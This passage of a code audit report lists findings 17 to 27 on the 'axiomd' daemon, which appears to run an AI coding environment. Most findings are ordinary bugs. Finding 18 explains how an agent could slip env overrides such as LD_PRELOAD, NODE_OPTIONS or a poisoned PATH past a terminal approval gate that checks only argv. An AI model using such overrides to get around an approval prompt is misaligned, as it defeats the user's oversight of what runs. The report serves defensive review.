it must keep the valid entries.

---

## 17. `ui/verify` build-error buffer stops recording after 500 lines

- **Category:** Functional
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/ui.rs:297-326`; consumer `ui.rs:200-206`
  (`axiom_inspect::verify(.., errors)`).

```rust
let v = m.entry(id.clone()).or_default();
if v.len() < 500 { v.push((ms, line.trim().chars().take(500).collect())); }   // never trimmed, never cleared
```

**What goes wrong.** The buffer keeps the *first* 500 build-error lines of a preview's life
and then drops every new one. In a long dev session, Vite prints errors on every HMR attempt,
so after 500 such lines `build_errors_since(now)` is always empty. `ui/verify` and `ui.verify`
then report no build errors while the page is actually broken. Objective verification is the
product's defining feature, so this is a correctness hole. `Previews::remove` is also never
called, so the map grows with every preview (see finding 24).

**Fix.** Keep a bounded ring by dropping the oldest (a `VecDeque` with `pop_front` at 500), or
prune entries older than the oldest pending verification.

**Verify.** A unit test: record 600 error lines with increasing times, then
`build_errors_since(t_of_line_550)` returns lines 550–599.

---

## 18. ACP terminal approval covers argv only

- **Category:** Security
- **Priority:** P2
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/tools.rs:1529-1576` (also `:1517-1527`), `crates/axiomd/src/acp.rs:25-65`.

```rust
async fn acp_prepare_terminal(..) -> Result<Targets, ToolError> { Ok(Targets { argv: Some(acp_argv(input)?), ..Default::default() }) }
async fn acp_terminal(..) { let cwd = match input["cwd"] ...;
    let mut env = spawn_env(app, ctx).await?;
    for e in input["env"].as_array()... { env.insert(n.into(), v.into()); }        // not in Targets
    let limit = input["outputByteLimit"].as_u64().unwrap_or(1024 * 1024) as usize; // agent-chosen
```

**What goes wrong.** The gate sees and shows only the argv. The agent can pass `env` (such as
`LD_PRELOAD`, `NODE_OPTIONS=--require ./x.js`, `PATH=./evil:$PATH`, or `GIT_*`) and `cwd`,
and those change what the approved command actually does. With an "Allow for session" rule
for an exact argv such as `["npm","test"]`, later calls can reuse that argv with any env or
cwd and still match without asking.

`outputByteLimit` comes from the agent and is not capped, so a huge value makes `acp.rs` keep
unbounded output. `acp_argv` also turns non-string args into `""` silently. Note that
security.md already says an ACP agent can act outside the gate; the issue here is that the
gate's own approval does not describe what it approves.

**Fix.**
- Include `env` overrides and `cwd` in `Targets` and in the approval preview. Make the
  session rule match argv, env and cwd, or refuse dangerous variables (`LD_*`, `DYLD_*`,
  `NODE_OPTIONS`, `PATH`) unless they are approved.
- Clamp `outputByteLimit` (for example to 16 MiB).
- Reject non-string args.

**Verify.** A gate test: approve `["echo","hi"]` for the session, then call `acp.terminal`
with the same argv and `env:[{name:"LD_PRELOAD",...}]`. Expect a new approval request, or a
refusal. Calling with `outputByteLimit: 1e18` is clamped.

---

## 19. Socket accept loop spins on persistent `accept()` errors

- **Category:** Reliability / Performance
- **Priority:** P3
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/socket.rs:199-203`.

```rust
loop { let Ok((stream, _)) = listener.accept().await else { continue; }; ... }
```

**What goes wrong.** `EMFILE` or `ENFILE` (descriptor exhaustion, which is plausible with
many watchers, language servers and PTYs) makes `accept` fail immediately every time, so this
loop pins a worker at 100% CPU until a descriptor frees up.

**Fix.** On error, log it (rate-limited) and sleep with backoff, for example 50 ms up to 1 s.

**Verify.** A unit test with a fake listener (or `RLIMIT_NOFILE` lowered in a child process)
that shows the loop yields and sleeps between failed accepts.

---

## 20. Socket start race can leave a mismatched token file

- **Category:** Reliability
- **Priority:** P3
- **Confidence:** Confirmed (race window)
- **Where:** `crates/axiomd/src/socket.rs:178-198`.

```rust
if socket.exists() { if connect.is_ok() { return Ok(None); } std::fs::remove_file(&socket)?; }
let token = random_token()?; let _ = std::fs::remove_file(&token_path);
OpenOptions::new().create_new(true).mode(0o600).open(&token_path)?.write_all(..);
let listener = tokio::net::UnixListener::bind(&socket)?;
```

**What goes wrong.** Two daemons start on the same data dir at once, for example the app and
`axiom` falling back to its own daemon. Both pass the `exists` check. D1 writes T1 and binds.
D2 removes T1, writes T2, and fails `bind` with `EADDRINUSE`. D2 returns `Err` and leaves T2
in place. D1 listens with T1 while the file says T2, so every socket client gets
`permission_denied` until D1 exits.

**Fix.** Bind first (atomic ownership), then write the token to a temp file and `rename` it
into place. On any failure after the token is written, remove the files written so far. Or
take an exclusive `flock` on `run/axiomd.lock` around the whole sequence.

**Verify.** A test that runs `listen` twice concurrently on the same dir: exactly one
returns `Some`, and a client using the token file can initialize.

---

## 21. Invalid-Request errors drop an id that can be read

- **Category:** Functional (protocol edge)
- **Priority:** P3
- **Confidence:** Confirmed
- **Where:** `crates/rpc/src/codec.rs:64-71`, `crates/rpc/src/server.rs:222-227`,
  `crates/protocol/src/envelope.rs:60-80`.

```rust
let msg = match codec::parse_message(line) { Ok(m) => m, Err(e) => { tx.send(response_err(None, e)) ... } };
```

**What goes wrong.** `{"jsonrpc":"2.0","id":7,"method":42}`, or `"jsonrpc":"1.0"` with a
valid id, is answered with `id: null`. JSON-RPC 2.0 requires `null` only when the id cannot
be determined. The client's request 7 is never answered, and it hangs until its timeout.

**Fix.** On an `InvalidRequest` failure, try to pull `id` out of the parsed `Value` (if it is
a number or string) and answer with it.

**Verify.** An rpc behaviour test: send that line and expect a response with `id: 7` and
`kind: invalid_request`.

---

## 22. External `fs/readFile` reads the whole file before its size check; FIFOs block

- **Category:** Reliability
- **Priority:** P3
- **Confidence:** Confirmed
- **Where:** `crates/axiomd/src/handlers/fs.rs:196-211`; `crates/workspace/src/workspace.rs:197-204`.

```rust
let bytes = tokio::fs::read(&path).await ...;      // whole file first
if bytes.len() > 16 * 1024 * 1024 { return Err(TooLarge) }
```

**What goes wrong.** A location a language server returns (untrusted code, per security.md)
can name `/dev/zero`, a FIFO, or a multi-GB file. The daemon reads it to EOF before the size
check: it runs out of memory on `/dev/zero` or a huge file, and blocks forever on a FIFO.

Inside the workspace, `read_text` checks `metadata.len()` first, but a FIFO reports length 0
and is not a directory, so `std::fs::read` blocks a `spawn_blocking` thread forever (cancel
cannot reach it).

**Fix.** Require `metadata.is_file()` and check `len()` before reading. Read through
`take(limit + 1)`. Open with `O_NONBLOCK` or refuse non-regular files.

**Verify.**
- An axiomd test: mark `file:///dev/zero` as allowed, then `fs/readFile` returns `too_large`
  or `invalid_params` quickly.
- A workspace test: `mkfifo p` and `read_text("p")` returns an error, not a hang.

---

## 23. A cancel racing a successful `task/start` or `build/run` orphans the task's forwarder

- **Category:** Functional
- **Priority:** P3
- **Confidence:** Confirmed
- **Where:** `crates/rpc/src/server.rs:484-508`; `crates/axiomd/src/handlers/task.rs:294-310`;
  `crates/axiomd/src/handlers/build.rs:234-292`.

**What goes wrong.** If `$/cancel` lands after the executor has spawned the process, either
before the supervisor removes the in-flight entry or during the handler's 100 ms grace, the
client gets `cancelled`. The process runs anyway. The after-response forwarder is dropped,
so `rx` is dropped too: no `task/output` or `task/exited` reaches the client. For
`build/run`, the diagnostics are not recorded (`record_diagnostics`) and build history is
never written. The task appears only in `task/list`.

**Fix.** When the outcome is `cancelled` but the handler had produced side effects, run a
compensation step: have `RequestCtx` expose `on_cancelled_after_success`, which cancels the
task. Alternatively, treat `task/start` as non-cancellable once the spawn has happened.

**Verify.** An rpc test with a handler that sleeps 50 ms after spawning: send `$/cancel` at
25 ms and assert the task is cancelled (not left running), or that the response carries the
task id.

---

## 24. Unbounded or stale daemon-lifetime caches

- **Category:** Performance / Functional
- **Priority:** P3
- **Confidence:** Confirmed
- **Where:**
  - `crates/workspace/src/ignore_rules.rs:33-46` (dir matcher cache, one entry per directory
    ever classified, including every directory under ignored trees that the watcher sees
    events in; cleared only by `invalidate_for_write`);
  - `crates/axiomd/src/handlers/ui.rs:276-282` (`Previews::remove` has no callers, so preview
    info, errors and selections are kept forever);
  - `crates/axiomd/src/acp.rs:38-41` (ACP terminals kept until the agent calls `release`; not
    cleared when the session or agent ends);
  - `crates/axiomd/src/app.rs:239-256` (dead notifiers; see finding 9);
  - `crates/exec/src/executor.rs:432-446` (50 finished tasks per *workspace id*; ids are never
    reused, so closed workspaces' histories accumulate).

**What goes wrong.** Memory grows slowly over a long session. There is also a functional
problem: when `fs/watch` is not active, a `.gitignore` changed outside the daemon (for example
by `git checkout`) is never re-read, so `fs/list`'s `ignored` flags stay stale.

**Fix.**
- Cap the ignore cache with an LRU, or invalidate on mtime, and only cache directories that
  are not ignored.
- Remove previews on stop or failure after a delay, and on `workspace/close`.
- Clear ACP terminals when an ACP session is killed.
- Prune the executor history of closed workspaces.

**Verify.**
- A unit test for `IgnoreCache` size after classifying 10,000 distinct directories.
- An axiomd test: after `workspace/close`, `preview/list` and the internal maps hold nothing
  for that workspace.

---

## 25. Outgoing lines are not bounded by the 64 MiB frame limit

- **Category:** Reliability (protocol framing)
- **Priority:** P3
- **Confidence:** Suspected
- **Where:** `crates/rpc/src/codec.rs:8-9, 73-83`; `docs/protocols/ipc.md:16` (a line over
  64 MiB is a fatal protocol error).

**What goes wrong.** The daemon enforces 64 MiB on input only. Several results can exceed it
once JSON-escaped:
- `agent/sessionOpen` returns the whole journal, with tool outputs up to 4 MiB each;
- `fs/readFile` of a 16 MiB file of control characters escapes about 6×;
- `workspace/search` with 20,000 matches.

A peer that applies the same rule closes the connection, which for the shell is the stdio
daemon. In the other direction, the shell writing back a 16 MiB file of control characters
exceeds 64 MiB, and the daemon ends the connection (`ServeError::LineTooLong`), killing every
task.

**Fix.** In `encode`, check the encoded length. If it is over `MAX_LINE`, replace the
response with a `too_large` error for that id. Make paged APIs (sessions, search) cap their
response size.

**Verify.** An rpc test: a handler returning a 70 MiB string yields a `too_large` error
response, and the connection survives.

---

## 26. Windows Job Object is assigned after spawn; terminal close on Windows kills only the shell

- **Category:** Platform (Windows, deferred)
- **Priority:** P3
- **Confidence:** Confirmed (code)
- **Where:** `crates/exec/src/tree_windows.rs:144-169`; `crates/exec/src/executor.rs:124-137`;
  `crates/term/src/lib.rs:221`.

**What goes wrong.**
- The child runs before `AssignProcessToJobObject`, so grandchildren it starts in that window
  are outside the job and survive cancel.
- If the assignment fails, the code calls `start_kill()` but does not wait for the child.
- On Windows, `Terminal::close` calls `ChildKiller::kill`, which ends only the shell process,
  not its descendants (ConPTY).

**Fix.**
- Spawn with `CREATE_SUSPENDED` (`creation_flags`), assign the job, then resume the main
  thread (or use `PROC_THREAD_ATTRIBUTE_JOB_LIST`).
- Put terminal shells in a job as well.

**Verify.** A Windows CI test: `cmd /C "start /b ping -n 60 127.0.0.1 & exit"`, then cancel,
and assert no `ping.exe` remains.

---

## 27. `crates/desktop-bridge` is dead product code that must stay in step with the Dart client

- **Category:** Architecture
- **Priority:** P3
- **Confidence:** Confirmed
- **Where:** `crates/desktop-bridge/src/lib.rs` (945 lines) and its tests; AGENTS.md says no
  shell links it. processes.md §Daemon lifecycle says the Dart `locateDaemon` uses "the same
  order as `crates/desktop-bridge::locate_daemon`".

**What goes wrong.** The bridge is a second implementation of the client lifecycle
(initialize timeout, shutdown escalation, stderr tail) that no product uses. Its tests pass
while the real client (`apps/desktop-flutter/lib/daemon/client.dart`) can drift. The lookup
order is now specified in two places, and only the unused one has Rust tests. The bridge also
has an unbounded `mpsc::unbounded_channel` for outgoing lines (`lib.rs:291`).

**Fix.** Either delete the crate (keep the lifecycle tests as daemon integration tests in
`crates/axiomd/tests/lifecycle.rs`), or document it as a test-only harness. Make the Dart
`locateDaemon` the single specified order, with Dart tests.

**Verify.** `cargo tree -i axiom-desktop-bridge` shows no product dependents. After removal
the lifecycle tests still pass from `axiomd/tests`.

---

## Areas reviewed and not reviewed

**Reviewed, with call paths traced end to end:**
- `crates/rpc`: codec, server (initialize, token gate, cancel, shutdown, dispatch), router,
  client.
- `crates/axiomd`: main, socket, app, router, `tools.rs` helpers (`run_to_end`, `read`,
  `apply_patch`, `task_run`, the ACP tools, `ui_selection`/`bound`), and `acp.rs`. Handlers:
  workspace, fs, task, terminal, git, settings, build, preview, sessions, the `ui.rs` forwarder
  and `Previews`, the `env.rs` helpers (`workspace`, `registry`, `project_environment`,
  `process_environment`, `project_file`), and the `lsp.rs` forwarder, `resync` and launch
  environment.
- `crates/workspace`: registry, `resolve`/list/read/write/remove, watch, both searches, the
  ignore cache, errors, git runner and watch.
- `crates/exec`: executor, backend, tree (Unix and Windows), utf8.
- `crates/store`: all of it.
- `crates/term`: all of it.
- `crates/protocol`: envelope/`Message` parsing, `WorkspacePath::is_lexically_valid`, a scan
  for panics.
- `crates/desktop-bridge`: outline only.

**Checked and found sound:**
- Path containment in `Workspace::resolve`: lexical rejection, canonical prefix,
  dangling-symlink refusal, component-wise `starts_with`.
- Atomic temp+rename writes with the version check under a per-path lock.
- `fs/list` does not follow symlinks; search walkers skip symlinks and non-regular files.
- SQLite migrations are transactional, with a `user_version` gate and corruption recovery.
- stdout is used only by the writer task (logging goes to stderr).
- No `unwrap`/`expect` reachable from wire input in scope.
- The in-flight id duplicate check, and handling of a panicking handler.
- UTF-8 chunking in exec and term.

**Not reviewed:**
- `crates/{env,build,agent,lsp,inspect}` internals: the gate, policy, checkpoints, MCP/ACP
  clients, language-server lifecycle, inspection protocol. These belong to other reviewers.
  This report flags only where axiomd uses them at a boundary (findings 2, 5, 11, 12, 18).
- `handlers/agent.rs` beyond the policy helpers, `handlers/lsp.rs` request/notify/restart
  bodies, and the rest of `handlers/env.rs` (install/uninstall flow).
- The rest of `tools.rs` (search, list, env, build, preview and UI tools beyond the parts
  named above).
- Every test file was read only as far as needed to check for coverage gaps (exec and watch).
- Windows behaviour was assessed from the code only.

Nothing was compiled or executed.
